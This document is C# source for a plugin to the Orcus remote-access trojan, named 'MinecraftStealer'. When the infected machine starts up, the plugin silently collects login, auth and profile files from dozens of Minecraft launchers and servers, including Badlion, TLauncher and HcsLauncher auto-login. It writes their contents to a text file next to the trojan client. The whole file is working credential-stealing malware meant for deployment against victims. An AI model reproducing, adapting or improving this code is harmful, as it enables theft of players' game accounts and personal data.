using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Orcus.Plugins;

namespace MinecraftStealer
{
    public class MinecraftStealer : ClientController
    {
        public override bool InfluenceStartup(IClientStartup clientStartup)
        {
            if (!clientStartup.IsAdministrator)
            {
                return false;
            }

            string clientPath = clientStartup.ClientPath;
            string outputFile = Path.Combine(Path.GetDirectoryName(clientPath), "minecraftgrab.txt");

            try
            {
                var minecraftData = GrabMinecraftData();
                SaveToFile(minecraftData, outputFile);
                return true;
            }
            catch (Exception)
            {
                // Silent fail
                return false;
            }
        }

        private List<object[]> GrabMinecraftData()
        {
            List<object[]> list = new List<object[]>();
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfilePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string systemPath = Environment.GetFolderPath(Environment.SpecialFolder.System);

            // Scan User Profile directories
            ScanUserProfileDirectories(userProfilePath, list);

            // Scan AppData directories
            ScanAppDataDirectories(appDataPath, list);

            // Scan System directories
            ScanSystemDirectories(systemPath, list);

            // Scan Badlion Client
            ScanBadlionClient(appDataPath, list);

            // Scan TLauncher
            ScanTLauncher(appDataPath, list);

            return list;
        }

        private void ScanUserProfileDirectories(string userProfilePath, List<object[]> list)
        {
            try
            {
                var directories = new Dictionary<string, string>
                {
                    { "\\loliland\\auth.json", "Minecraft/ModsServers/loliland/auth.json" },
                    { "\\.cristalix\\settings.bin", "Minecraft/ModsServers/cristalix/settings.bin" },
                    { "\\.prostocraft\\settings.json", "Minecraft/ModsServers/prostocraft/settings.json" },
                    { "\\Pentacraft\\settings.bin", "Minecraft/ModsServers/Pentacraft/settings.bin" },
                    { "\\ARAGO\\settings.bin", "Minecraft/ModsServers/ARAGO/settings.bin" },
                    { "\\mcdayz\\settings.bin", "Minecraft/ModsServers/mcdayz/settings.bin" },
                    { "\\cubixworld\\settings.bin", "Minecraft/ModsServers/cubixworld/settings.bin" },
                    { "\\orangecraft\\settings.bin", "Minecraft/ModsServers/orangecraft/settings.bin" },
                    { "\\Letragon\\settings.bin", "Minecraft/ModsServers/Letragon/settings.bin" },
                    { "\\MythicalWorld\\settings.bin", "Minecraft/ModsServers/MythicalWorld/settings.bin" }
                };

                foreach (var dir in directories)
                {
                    string fullPath = userProfilePath + dir.Key;
                    if (File.Exists(fullPath))
                    {
                        list.Add(new object[] { dir.Value, File.ReadAllBytes(fullPath) });
                    }
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        private void ScanAppDataDirectories(string appDataPath, List<object[]> list)
        {
            try
            {
                var directories = new Dictionary<string, string>
                {
                    { "\\.BlackDragoN\\launcher.config", "Minecraft/ModsServers/BlackDragoN/launcher.config" },
                    { "\\.LavaServer\\Settings.reg", "Minecraft/ModsServers/LavaServer/Settings.reg" },
                    { "\\.minecraftonly\\userdata", "Minecraft/ModsServers/minecraftonly/userdata" },
                    { "\\McSkill\\settings.bin", "Minecraft/ModsServers/McSkill/settings.bin" },
                    { "\\VictoryCraft\\settings.bin", "Minecraft/ModsServers/VictoryCraft/settings.bin" },
                    { "\\.simplemc\\profiles.json", "Minecraft/ModsServers/SimpleMinecraft/profiles.json" },
                    { "\\Borealis.su\\settings.json", "Minecraft/ModsServers/Borealis/settings.json" },
                    { "\\GamaiLauncher\\settings.json", "Minecraft/ModsServers/GamaiLauncher/settings.json" },
                    { "\\GravityCraft\\settings.json", "Minecraft/ModsServers/GravityCraft/settings.json" },
                    { "\\ShadowCraft\\settings.bin", "Minecraft/ModsServers/ShadowCraft/settings.bin" },
                    { "\\SideMC\\settings.bin", "Minecraft/ModsServers/SideMC/settings.bin" },
                    { "\\StreamCraft\\profiles.json", "Minecraft/ModsServers/StreamCraft/profiles.json" },
                    { "\\.exlauncher\\profile.dat", "Minecraft/ModsServers/ExcaliburCraft/profile.dat" },
                    { "\\GamePoint\\settings.json", "Minecraft/ModsServers/GamePoint/settings.json" },
                    { "\\.redserver\\settings.json", "Minecraft/ModsServers/RedServer/settings.json" },
                    { "\\.rus-minecraft\\settings.json", "Minecraft/ModsServers/rus-minecraft/settings.json" },
                    { "\\TikTokWorld\\settings.json", "Minecraft/ModsServers/TikTokWorld/settings.json" },
                    { "\\FineMine0\\settings.json", "Minecraft/ModsServers/FineMine0/settings.json" },
                    { "\\.cXPLauncher\\settings.json", "Minecraft/ModsServers/CaveXP/settings.json" },
                    { "\\.mix-servers2\\launcher.config", "Minecraft/ModsServers/mix-servers2/launcher.config" }
                };

                foreach (var dir in directories)
                {
                    string fullPath = appDataPath + dir.Key;
                    if (File.Exists(fullPath))
                    {
                        list.Add(new object[] { dir.Value, File.ReadAllBytes(fullPath) });
                    }
                }

                // Special files
                string hcsLauncherPath = appDataPath + "HcsLauncher-auto-login.json";
                if (File.Exists(hcsLauncherPath))
                {
                    list.Add(new object[] {
                        "Minecraft/ModsServers/hcs/HcsLauncher-auto-login.json",
                        File.ReadAllBytes(hcsLauncherPath)
                    });
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        private void ScanSystemDirectories(string systemPath, List<object[]> list)
        {
            try
            {
                var directories = new Dictionary<string, string>
                {
                    { "\\.warmine\\config.json", "Minecraft/ModsServers/WarMine/config.json" },
                    { "\\.lemoncraft\\launcher.dat", "Minecraft/ModsServers/LemonCraft/launcher.dat" }
                };

                foreach (var dir in directories)
                {
                    string fullPath = systemPath + dir.Key;
                    if (File.Exists(fullPath))
                    {
                        list.Add(new object[] { dir.Value, File.ReadAllBytes(fullPath) });
                    }
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        private void ScanBadlionClient(string appDataPath, List<object[]> list)
        {
            try
            {
                string badlionPath = appDataPath + "\\Badlion Client\\";
                if (Directory.Exists(badlionPath))
                {
                    string authDataPath = badlionPath + "auth.data";
                    string configPath = badlionPath + "config.json";

                    if (File.Exists(authDataPath))
                    {
                        list.Add(new object[] {
                            "Minecraft/BadlionClient/auth.data",
                            File.ReadAllBytes(authDataPath)
                        });
                    }

                    if (File.Exists(configPath))
                    {
                        list.Add(new object[] {
                            "Minecraft/BadlionClient/config.json",
                            File.ReadAllBytes(configPath)
                        });
                    }
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        private void ScanTLauncher(string appDataPath, List<object[]> list)
        {
            try
            {
                string[] tlauncherPaths = {
                    "C:\\Users\\2021\\AppData\\Roaming\\.minecraft\\",
                    appDataPath + "\\.minecraft\\",
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData", "Roaming", ".minecraft")
                };

                foreach (string path in tlauncherPaths)
                {
                    if (Directory.Exists(path))
                    {
                        string profilesPath = Path.Combine(path, "launcher_profiles.json");
                        string tlauncherProfilesPath = Path.Combine(path, "TlauncherProfiles.json");

                        if (File.Exists(profilesPath))
                        {
                            string relativePath = $"Minecraft/TLauncher/{new DirectoryInfo(path).Name}/launcher_profiles.json";
                            list.Add(new object[] { relativePath, File.ReadAllBytes(profilesPath) });
                        }

                        if (File.Exists(tlauncherProfilesPath))
                        {
                            string relativePath = $"Minecraft/TLauncher/{new DirectoryInfo(path).Name}/TlauncherProfiles.json";
                            list.Add(new object[] { relativePath, File.ReadAllBytes(tlauncherProfilesPath) });
                        }
                    }
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        private void SaveToFile(List<object[]> minecraftData, string outputPath)
        {
            try
            {
                StringBuilder sb = new StringBuilder();

                if (minecraftData.Count == 0)
                {
                    sb.AppendLine("Minecraft Stealer Results");
                    sb.AppendLine("=========================");
                    sb.AppendLine($"Generated: {DateTime.Now}");
                    sb.AppendLine();
                    sb.AppendLine("No Minecraft files were found on this system.");
                    sb.AppendLine("The following locations were checked:");
                    sb.AppendLine("- User Profile directories (loliland, cristalix, prostocraft, etc.)");
                    sb.AppendLine("- AppData directories (BlackDragoN, LavaServer, McSkill, etc.)");
                    sb.AppendLine("- System directories (WarMine, LemonCraft)");
                    sb.AppendLine("- Badlion Client");
                    sb.AppendLine("- TLauncher");
                    sb.AppendLine("Orcus plugin by zack3r");
                }
                else
                {
                    sb.AppendLine("Minecraft Stealer Results");
                    sb.AppendLine("=========================");
                    sb.AppendLine($"Generated: {DateTime.Now}");
                    sb.AppendLine($"Total files found: {minecraftData.Count}");
                    sb.AppendLine();

                    foreach (object[] data in minecraftData)
                    {
                        string filePath = (string)data[0];
                        byte[] fileContent = (byte[])data[1];

                        sb.AppendLine($"File: {filePath}");
                        sb.AppendLine($"Size: {fileContent.Length} bytes");

                        // Try to read as text for certain file types
                        if (filePath.EndsWith(".json") || filePath.EndsWith(".config") ||
                            filePath.EndsWith(".ini") || filePath.EndsWith(".cfg"))
                        {
                            try
                            {
                                string content = Encoding.UTF8.GetString(fileContent);
                                sb.AppendLine("Content:");
                                sb.AppendLine(content);
                            }
                            catch
                            {
                                sb.AppendLine("Content: [Binary data - cannot display]");
                            }
                        }
                        else if (filePath.EndsWith(".dat") || filePath.EndsWith(".bin") || filePath.EndsWith(".data"))
                        {
                            sb.AppendLine("Content: [Binary data - encrypted/compressed]");
                        }
                        else
                        {
                            sb.AppendLine("Content: [Unknown format]");
                        }

                        sb.AppendLine(new string('-', 60));
                        sb.AppendLine();
                    }
                }

                File.WriteAllText(outputPath, sb.ToString());
            }
            catch
            {
                // Silent fail
            }
        }
    }
}